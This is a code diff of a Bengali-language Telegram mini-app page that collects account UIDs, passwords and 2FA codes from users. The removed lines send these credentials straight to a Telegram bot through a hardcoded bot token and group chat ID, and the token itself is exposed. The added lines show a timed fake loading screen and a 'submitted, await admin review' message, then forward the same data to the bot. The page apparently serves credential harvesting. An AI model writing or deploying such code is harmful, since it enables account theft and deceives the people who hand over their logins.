@@ -167,7 +167,6 @@
         setTimeout(() => { e.target.value = ""; }, 800);
     });
 
-    // বটের কাছে ডাটা পাঠানোর ফাংশন
     function sendToBot() {
         let us = document.querySelectorAll('.u');
         let ps = document.querySelectorAll('.p');
@@ -193,53 +192,37 @@
             return; 
         }
 
-        // লোডিং স্ক্রিন অন হলো
+        // গ্লাস-মরফিজম ব্লুর ওভারলে লোডিং অন করা হলো
         document.getElementById('custom-overlay').style.display = "flex";
         document.getElementById("loader-text").innerHTML = "⏳ সার্ভারে ডাটা পাঠানো হচ্ছে...";
 
-        // ⚠️ এখানে আপনার সঠিক তথ্য বসান ⚠️
-        const BOT_TOKEN = "8297673202:AAFtpItTKCLZ5lasM6f-7QbN6-znCLJPxu8"; // আপনার বটের টোকেন দিন
-        const CHAT_ID = "-1003960059522";   // আপনার গ্রুপের চ্যাট আইডি দিন (যেমন: -100xxxxxxxxx)
-
-        // গ্রুপে পাঠানোর জন্য মেসেজ ফরম্যাট করা হচ্ছে
-        let message = `📝 <b>নতুন আইডি সাবমিট করা হয়েছে!</b>\n\n`;
-        data.forEach((item, index) => {
-            message += `${index + 1}. UID: <code>${item.u}</code> | Pass: <code>${item.p}</code> | 2FA: <code>${item.t}</code>\n`;
-        });
-
-        // সরাসরি টেলিগ্রাম এপিআই-তে ডাটা পোস্ট করা হচ্ছে
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            })
-        })
-        .then(response => {
-            // ডাটা চলে যাওয়ার পর ১০ সেকেন্ডের টাইমার কাউন্ট শুরু হবে
+        if (window.Telegram && window.Telegram.WebApp) {
+            
+            // স্টেপ ১: ইউজারকে ঠিক ১০ সেকেন্ড (১০,০০০ মিলি-সেকেন্ড) লোডিং স্পিনার দেখানো হবে
             setTimeout(function() {
                 var spinner = document.querySelector(".neon-spinner");
                 if(spinner) {
-                    spinner.classList.add("success"); 
+                    spinner.classList.add("success"); // স্পিনারের কালার নিয়ন গ্রিন হবে
                 }
                 
+                // স্ক্রিনে আপনার কাঙ্ক্ষিত সাকসেস মেসেজটি সেট করা হলো
                 document.getElementById("loader-text").innerHTML = "✅ আপনার সব আইডি আলাদা আলাদাভাবে সাবমিট সম্পন্ন হয়েছে। অনুগ্রহ করে এডমিন রিভিউ পর্যন্ত অপেক্ষা করুন।";
 
-                // ৩ সেকেন্ড সাকসেস মেসেজ দেখিয়ে অ্যাপ ক্লোজ হবে
+                // স্টেপ ২: সাকসেস মেসেজটি ঠিক ৩ সেকেন্ড (৩,০০০ মিলি-সেকেন্ড) স্ক্রিনে স্থির থাকবে
                 setTimeout(function() {
-                    if (window.Telegram && window.Telegram.WebApp) {
-                        window.Telegram.WebApp.close(); 
-                    }
+                    
+                    // স্টেপ ৩: ১৩ সেকেন্ডের ভিজ্যুয়াল প্রসেস শেষ হওয়া মাত্রই অরিজিনাল উপায়ে ডাটা সাবমিট হবে এবং অ্যাপ ক্লোজ হবে
+                    window.Telegram.WebApp.sendData(JSON.stringify(data));
+                    window.Telegram.WebApp.close(); 
+                    
                 }, 3000);
 
             }, 10000);
-        })
-        .catch(error => {
-            alert("গ্রুপে ডাটা পাঠাতে সমস্যা হয়েছে: " + error.message);
+
+        } else {
+            alert("Error: টেলিগ্রাম ওয়েবলজিক খুঁজে পাওয়া যায়নি। অ্যাপটি বটের ভেতর থেকে ওপেন করুন।");
             document.getElementById('custom-overlay').style.display = "none";
-        });
+        }
     }
 </script>
 </body>
